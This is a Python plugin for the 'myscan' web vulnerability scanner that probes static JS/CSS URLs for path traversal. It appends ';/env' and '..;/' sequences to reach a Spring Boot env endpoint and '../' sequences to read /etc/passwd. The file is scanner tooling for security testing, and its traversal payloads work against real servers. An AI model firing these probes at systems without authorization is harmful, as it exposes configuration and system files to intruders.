#!/usr/bin/env python3
# @Time    : 2020-02-17
# @Author  : caicai
# @File    : myscan_crlf.py
# refer:https://github.com/w-digital-scanner/w13scan/blob/master/W13SCAN/plugins/PerFile/crlf.py

import copy
import re
from myscan.lib.helper.request import request
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.core.const import notAcceptedExt
import requests


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get(
            "data")  # self.url为需要测试的url，但不会包含url参数，如https://www.baidu.com/index.php#tip1 .不会携带url参数，如?keyword=1
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "path traveral"
        self.vulmsg = "静态文件下的路径遍历"
        self.level = 1  # 0:Low  1:Medium 2:High

    def verify(self):
        if self.dictdata.get("url").get("url").count("/") >= 4 and self.dictdata.get("url").get("extension") in ["js", "css"] and self.dictdata.get("response").get("status") == 200:
            number = self.dictdata.get("url").get("url").count("/") - 2
            headers = self.dictdata.get("request").get("headers")
            resp = requests.get(self.url + ";/env", headers=headers)
            if resp.status_code == 200 and "java.vm.version" in resp.text:
                self.result.append({
                    "name": self.name,
                    "url": self.url + ";/env",
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg + "可以直接访问springboot的env接口",
                        "source_url": self.url,
                        "new_url": self.url + ";/env"
                    }
                })
            resp1 = requests.get(self.url + "/" + "..;/" * number + "env", headers=headers)
            if resp1.status_code == 200 and "java.vm.version" in resp1.text:
                self.result.append({
                    "name": self.name,
                    "url": self.url + "/" + "..;/" * number + "env",
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg + "可以直接访问springboot的env接口",
                        "source_url": self.url,
                        "new_url": self.url + "/" + "..;/" * number + "env"
                    }
                })
            resp2 = requests.get(self.url + "/" + "../" * number + "etc/passwd", headers=headers)
            if resp2.status_code == 200 and "root:x:" in resp2.text:
                self.result.append({
                    "name": self.name,
                    "url": self.url + "/" + "../" * number + "etc/passwd",
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg + "可以任意文件读取",
                        "source_url": self.url,
                        "new_url": self.url + "/" + "../" * number + "etc/passwd"
                    }
                })
